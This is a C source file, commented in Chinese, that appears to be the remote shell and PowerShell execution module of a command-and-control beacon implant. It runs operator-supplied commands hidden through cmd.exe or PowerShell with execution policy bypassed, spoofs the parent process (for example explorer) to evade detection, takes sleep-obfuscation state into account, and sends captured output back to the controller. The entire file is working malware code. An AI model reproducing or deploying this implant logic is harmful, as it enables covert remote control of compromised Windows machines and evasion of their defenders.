#include "beacon_commands.h"
#include "beacon_spawn.h"

/*
 * shell / powershell 命令执行模块。
 * 命令以后台 Job 运行，stdout/stderr 经管道捕获后按原 task_id 回传。
 */

/* 将 exec 命令输出以数组前缀字节打包到 ByteBuf 中 */
static ByteBuf PacketPackTextArray(const CHAR* text)
{
    ByteBuf out;
    BbInit(&out);
    PacketArrayBytes(&out, text, text ? strlen(text) : 0);
    return out;
}

typedef struct ShellJobArgs {
    BeaconContext* ctx;
    BeaconJob* job;
    WCHAR* cmdline;
    UINT acp;
} ShellJobArgs;

/* 启动进程并将其 stdout/stderr 捕获到 ByteBuf 中 */
static ByteBuf RunProcessCapture(BeaconContext* ctx,
                                 BeaconJob* job, const WCHAR* cmdline, UINT acp)
{
    SECURITY_ATTRIBUTES sa;
    HANDLE read_pipe = NULL, write_pipe = NULL;
    HANDLE stdin_r = NULL, stdin_w = NULL;
    HANDLE stdout_h = NULL, stderr_h = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    SpawnOptions spawn_opt;
    WCHAR* mutable_cmd = HeapStrDupW(cmdline);
    ByteBuf raw;
    ByteBuf out;
    CHAR buffer[4096];
    DWORD read = 0;
    DWORD exit_code = 0;
    DWORD create_error = 0;
    HANDLE self;

    BbInit(&raw);
    BbInit(&out);

    /* 配置管道安全属性以允许句柄继承 */
    ZeroMemory(&sa, sizeof(sa));
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    /* stdout/stderr 管道：读端不可继承，写端稍后 dup 成两个不同 HANDLE */
    if (!CreatePipe(&read_pipe, &write_pipe, &sa, 0)) {
        create_error = GetLastError();
        goto cleanup;
    }
    SetHandleInformation(read_pipe, HANDLE_FLAG_INHERIT, 0);

    /* stdin 用管道，不用控制台 GetStdHandle：假父（explorer）里 CHAR 句柄会失败 */
    if (!CreatePipe(&stdin_r, &stdin_w, &sa, 0)) {
        create_error = GetLastError();
        goto cleanup;
    }
    SetHandleInformation(stdin_w, HANDLE_FLAG_INHERIT, 0);

    self = ctx->api.pfnGetCurrentProcess ? ctx->api.pfnGetCurrentProcess()
                                         : GetCurrentProcess();
    if (!ctx->api.pfnDuplicateHandle ||
        !ctx->api.pfnDuplicateHandle(self, write_pipe, self, &stdout_h,
                                     0, TRUE, DUPLICATE_SAME_ACCESS) ||
        !ctx->api.pfnDuplicateHandle(self, write_pipe, self, &stderr_h,
                                     0, TRUE, DUPLICATE_SAME_ACCESS)) {
        create_error = GetLastError();
        goto cleanup;
    }
    SetHandleInformation(write_pipe, HANDLE_FLAG_INHERIT, 0);

    /* 配置启动信息：隐藏窗口并重定向句柄 */
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = stdout_h;
    si.hStdError = stderr_h;
    si.hStdInput = stdin_r;
    ZeroMemory(&pi, sizeof(pi));

    /* PPID：走全局 spawn_ppid。PARENT_PROCESS 时 SpawnCreateProcess 会把
     * 上面三个句柄 DuplicateHandle 进假父，si.hStd* 填父进程句柄值。 */
    ZeroMemory(&spawn_opt, sizeof(spawn_opt));
    spawn_opt.ppid = SpawnGetPpid();
    spawn_opt.fallback_plain = TRUE;

    if (JobIsCancelRequested(job)) {
        out = PacketPackTextArray("Job killed before process start");
        goto cleanup;
    }

    /* 创建子进程（统一入口：ppid>0 时走 STARTUPINFOEX 欺骗） */
    if (!mutable_cmd ||
        !SpawnCreateProcess(&ctx->api, &spawn_opt,
                            NULL, mutable_cmd, NULL, NULL, TRUE,
                            CREATE_NO_WINDOW, NULL, NULL, &si, &pi,
                            NULL, 0)) {
        create_error = GetLastError();
        goto cleanup;
    }
    JobSetProcessHandle(job, pi.hProcess);

    /* 关掉所有写端，读端才能收到 EOF */
    CloseHandle(write_pipe);
    write_pipe = NULL;
    CloseHandle(stdout_h);
    stdout_h = NULL;
    CloseHandle(stderr_h);
    stderr_h = NULL;
    CloseHandle(stdin_r);
    stdin_r = NULL;
    CloseHandle(stdin_w);
    stdin_w = NULL;

    /* 读取所有进程输出直到 EOF */
    while (!JobIsCancelRequested(job) &&
           ReadFile(read_pipe, buffer, sizeof(buffer), &read, NULL) && read > 0) {
        BbAppend(&raw, buffer, read);
    }

    /* 等待进程退出并将输出转换为 UTF-8 */
    if (JobIsCancelRequested(job)) {
        TerminateProcess(pi.hProcess, 1);
    }
    WaitForSingleObject(pi.hProcess, INFINITE);
    JobSetProcessHandle(job, NULL);

    if (JobIsCancelRequested(job)) {
        out = PacketPackTextArray("Job killed");
    } else {
        CHAR* utf8 = SystemBytesToUtf8(raw.data, raw.len, acp);
        if (utf8) {
            if (GetExitCodeProcess(pi.hProcess, &exit_code) && exit_code != 0) {
                ByteBuf text;
                BbInit(&text);
                BbPrintf(&text, "Error: exit status %lu\nOutput: %s", (ULONG)exit_code, utf8);
                out = PacketPackTextArray((const CHAR*)text.data);
                BbFree(&text);
            } else {
                out = PacketPackTextArray(utf8);
            }
            HeapFree(GetProcessHeap(), 0, utf8);
        }
    }
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (pi.hThread) CloseHandle(pi.hThread);

cleanup:
    /* 若未捕获到输出则报告 CreateProcess 失败 */
    if (out.len == 0 && create_error != 0) {
        CHAR msg[96];
        snprintf(msg, sizeof(msg), "Error: CreateProcess failed: %lu", (ULONG)create_error);
        out = PacketPackTextArray(msg);
    }
    if (read_pipe) CloseHandle(read_pipe);
    if (write_pipe) CloseHandle(write_pipe);
    if (stdout_h) CloseHandle(stdout_h);
    if (stderr_h) CloseHandle(stderr_h);
    if (stdin_r) CloseHandle(stdin_r);
    if (stdin_w) CloseHandle(stdin_w);
    HeapFree(GetProcessHeap(), 0, mutable_cmd);
    BbFree(&raw);
    return out;
}

/* Shell Job 线程入口：执行命令、回传结果并完成 Job 生命周期 */
static DWORD WINAPI ShellJobThread(PVOID param)
{
    ShellJobArgs* args = (ShellJobArgs*)param;
    ByteBuf out;

    if (!args || !args->ctx || !args->job) {
        if (args && args->ctx) RuntimeActivityEnd(args->ctx);
        return 0;
    }

    out = RunProcessCapture(args->ctx, args->job, args->cmdline, args->acp);
    if (out.len == 0) {
        BbPrintf(&out, "Job %lu finished", (ULONG)args->job->task_id);
    }
    if (out.len > 0) {
        JobEnqueueResult(args->ctx, args->job->task_id, args->job->command_id, &out);
    }
    BbFree(&out);

    HeapFree(GetProcessHeap(), 0, args->cmdline);
    RuntimeActivityEnd(args->ctx);
    JobComplete(args->job);
    HeapFree(GetProcessHeap(), 0, args);
    return 0;
}

/* shell/powershell 使用 raw command：argCount 固定为 1，字符串内容不再拆分重组。 */
static CHAR* ReadRawCommand(Parser* p, INT powershell, ByteBuf* error)
{
    UINT32 count = ParserU32(p);
    CHAR* command;

    if (p->error[0]) {
        return NULL;
    }

    if (count != 1) {
        CHAR msg[160];
        snprintf(msg, sizeof(msg),
                 "%s expects exactly 1 raw command string, got %lu; do not split by spaces",
                 powershell ? "powershell" : "shell", (ULONG)count);
        *error = PacketPackTextArray(msg);
        return NULL;
    }

    command = ParserString(p);
    if (p->error[0]) {
        HeapFree(GetProcessHeap(), 0, command);
        return NULL;
    }

    if (ParserLeft(p) != 0) {
        HeapFree(GetProcessHeap(), 0, command);
        *error = PacketPackTextArray("shell payload has trailing bytes after raw command");
        return NULL;
    }

    if (!command || !*command) {
        HeapFree(GetProcessHeap(), 0, command);
        *error = PacketPackTextArray(powershell ? "powershell requires a raw command string" : "shell requires a raw command string");
        return NULL;
    }

    return command;
}

/* 执行 shell 或 powershell 命令：v1 作为后台 process job 启动 */
ByteBuf CommandShell(BeaconContext* ctx, UINT32 task_id, UINT32 command_id, Parser* parser, INT powershell)
{
    CHAR* args;
    ByteBuf out;
    WCHAR* wargs;
    const WCHAR* prefix;
    WCHAR* cmd;
    SIZE_T len;
    BeaconJob* job;
    ShellJobArgs* job_args;

    BbInit(&out);
    args = ReadRawCommand(parser, powershell, &out);

    if (!args) {
        if (out.len != 0) {
            return out;
        }
        return PacketPackTextArray(parser->error[0] ? parser->error : "failed to parse raw command");
    }

    /* 使用 shell/powershell 前缀构建命令行 */
    wargs = Utf8ToWide(args);
    prefix = powershell ? L"powershell.exe -ExecutionPolicy Bypass -Command " : L"cmd.exe /c ";
    len = wcslen(prefix) + wcslen(wargs) + 1;
    cmd = (WCHAR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (SIZE_T)(len) * sizeof(WCHAR));
    if (cmd) {
        wcscpy_s(cmd, len, prefix);
        wcscat_s(cmd, len, wargs);
    } else {
        HeapFree(GetProcessHeap(), 0, args);
        HeapFree(GetProcessHeap(), 0, wargs);
        return PacketPackTextArray("failed to allocate command line");
    }

    if (!RuntimeActivityBegin(ctx)) {
        HeapFree(GetProcessHeap(), 0, args);
        HeapFree(GetProcessHeap(), 0, wargs);
        HeapFree(GetProcessHeap(), 0, cmd);
        return PacketPackTextArray("process job blocked while sleep obfuscation is active");
    }

    job = JobCreate(ctx, task_id, command_id, JOB_TYPE_PROCESS, powershell ? "powershell" : "shell");
    if (!job) {
        RuntimeActivityEnd(ctx);
        HeapFree(GetProcessHeap(), 0, args);
        HeapFree(GetProcessHeap(), 0, wargs);
        HeapFree(GetProcessHeap(), 0, cmd);
        return PacketPackTextArray("failed to create job");
    }

    job_args = (ShellJobArgs*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*job_args));
    if (!job_args) {
        JobComplete(job);
        RuntimeActivityEnd(ctx);
        HeapFree(GetProcessHeap(), 0, args);
        HeapFree(GetProcessHeap(), 0, wargs);
        HeapFree(GetProcessHeap(), 0, cmd);
        return PacketPackTextArray("failed to allocate job args");
    }

    job_args->ctx = ctx;
    job_args->job = job;
    job_args->cmdline = cmd;
    job_args->acp = ctx->meta.acp;

    if (!JobStartThread(job, ShellJobThread, job_args)) {
        JobComplete(job);
        RuntimeActivityEnd(ctx);
        HeapFree(GetProcessHeap(), 0, job_args);
        HeapFree(GetProcessHeap(), 0, args);
        HeapFree(GetProcessHeap(), 0, wargs);
        HeapFree(GetProcessHeap(), 0, cmd);
        return PacketPackTextArray("failed to start job thread");
    }

    {
        CHAR msg[96];
        snprintf(msg, sizeof(msg), "Job %lu started: %s",
                 (ULONG)task_id, powershell ? "powershell" : "shell");
        out = PacketPackTextArray(msg);
    }

    /* 清理已分配的资源 */
    HeapFree(GetProcessHeap(), 0, args);
    HeapFree(GetProcessHeap(), 0, wargs);
    return out;
}
